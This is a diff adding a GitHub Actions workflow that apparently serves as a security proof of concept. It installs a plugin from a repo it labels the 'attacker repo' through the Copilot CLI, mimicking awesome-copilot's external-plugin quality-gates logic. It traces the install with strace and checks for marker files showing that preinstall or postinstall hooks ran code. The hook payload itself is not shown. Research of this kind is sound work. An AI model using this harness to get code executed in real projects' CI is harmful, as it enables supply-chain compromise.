@@ -1,0 +1,123 @@
+name: Copilot Install Deep Proof
+on: workflow_dispatch
+jobs:
+  prove:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Node
+        uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          
+      - name: Install tools
+        run: |
+          npm install -g @github/copilot
+          copilot --version
+          echo "Copilot installed at: $(which copilot)"
+          
+      - name: Clone attacker repo
+        run: |
+          mkdir -p /tmp/work/submission
+          cd /tmp/work/submission
+          git init -q
+          git remote add origin https://github.com/blooddiamondz/copilot-plugin-proof.git
+          git fetch --depth=1 origin main
+          git checkout --detach FETCH_HEAD
+          echo "=== Files ==="
+          find . -type f | head -20
+          
+      - name: Build marketplace EXACTLY like quality-gates
+        run: |
+          echo "=== Building marketplace like quality-gates script ==="
+          mkdir -p /tmp/work/marketplace
+          
+          # This is EXACTLY how buildEphemeralMarketplace creates it
+          cat > /tmp/work/marketplace/marketplace.json << 'MKEOF'
+          {
+            "name": "external-plugin-intake",
+            "metadata": {
+              "description": "Temporary marketplace for external plugin intake smoke tests",
+              "version": "1.0.0"
+            },
+            "owner": {
+              "name": "awesome-copilot-intake",
+              "email": "noreply@github.com"
+            },
+            "plugins": [
+              {
+                "name": "proof-of-concept-plugin",
+                "source": {
+                  "repo": "blooddiamondz/copilot-plugin-proof",
+                  "ref": "main",
+                  "path": "."
+                },
+                "pluginRoot": ".",
+                "keywords": []
+              }
+            ]
+          }
+          MKEOF
+          
+          cat /tmp/work/marketplace/marketplace.json
+          
+      - name: Test copilot marketplace add
+        run: |
+          export HOME=/tmp/copilot-home
+          mkdir -p $HOME
+          echo "=== copilot plugin marketplace add ==="
+          copilot plugin marketplace add /tmp/work/marketplace 2>&1
+          echo "Exit: $?"
+          echo "=== List marketplaces ==="
+          copilot plugin marketplace list 2>&1 || echo "Cannot list"
+          
+      - name: Test copilot plugin install with strace
+        run: |
+          export HOME=/tmp/copilot-home
+          echo "=== copilot plugin install ==="
+          # Strace to capture all exec* and open* syscalls
+          strace -f -e trace=execve,openat -o /tmp/strace_copilot.log \
+            copilot plugin install "proof-of-concept-plugin@external-plugin-intake" 2>&1 || echo "Install failed with exit $?"
+          
+          echo "=== CHECK EXECUTION ==="
+          cat /tmp/copilot_rce_proof.txt 2>/dev/null && echo "POSTINSTALL EXECUTED!" || echo "postinstall NOT executed"
+          cat /tmp/copilot_preinstall_proof.txt 2>/dev/null && echo "PREINSTALL EXECUTED!" || echo "preinstall NOT executed"
+          
+          echo "=== STRACE: npm/node/sh invocations ==="
+          grep -i "npm\|node\|bash\|sh\|install" /tmp/strace_copilot.log 2>/dev/null | head -30
+          
+          echo "=== STRACE: files opened in attacker repo ==="
+          grep "copilot-plugin-proof\|submission\|installed-plugins" /tmp/strace_copilot.log 2>/dev/null | head -20
+          
+          echo "=== Installed plugin directory ==="
+          find /tmp/copilot-home -name "*.json" -o -name "*.js" -o -name "*.sh" 2>/dev/null | head -20
+          ls -laR /tmp/copilot-home/.copilot/ 2>/dev/null | head -30
+          
+      - name: Alternative - Simulate quality-gates EXACTLY
+        run: |
+          echo "=== RUNNING EXACT QUALITY GATES LOGIC ==="
+          export HOME=/tmp/copilot-home2
+          mkdir -p $HOME
+          
+          # Clone the quality-gates script from awesome-copilot
+          mkdir -p /tmp/ac-checkout
+          cd /tmp/ac-checkout
+          git init -q
+          git remote add origin https://github.com/github/awesome-copilot.git
+          git fetch --depth=1 origin main
+          git checkout --detach FETCH_HEAD
+          
+          echo "=== Install quality gate dependencies ==="
+          npm install @microsoft/vally 2>&1 | tail -5
+          
+          echo "=== Run the quality gates script against our plugin ==="
+          PLUGIN_JSON='[{"name":"proof-of-concept-plugin","source":{"repo":"blooddiamondz/copilot-plugin-proof","ref":"main","path":"."},"keywords":[]}]'
+          node eng/external-plugin-pr-quality-gates.mjs --plugins-json "$PLUGIN_JSON" 2>&1 | head -30
+          
+          echo "=== CHECK EXECUTION AFTER QUALITY GATES ==="
+          cat /tmp/copilot_rce_proof.txt 2>/dev/null && echo "POSTINSTALL EXECUTED VIA QUALITY GATES!" || echo "postinstall NOT executed"
+          cat /tmp/copilot_preinstall_proof.txt 2>/dev/null && echo "PREINSTALL EXECUTED VIA QUALITY GATES!" || echo "preinstall NOT executed"
+          
+          echo "=== Check all files created in tmp ==="
+          find /tmp -name "*rce*" -o -name "*proof*" -o -name "*preinstall*" 2>/dev/null
+          
+          echo "=== DONE ==="
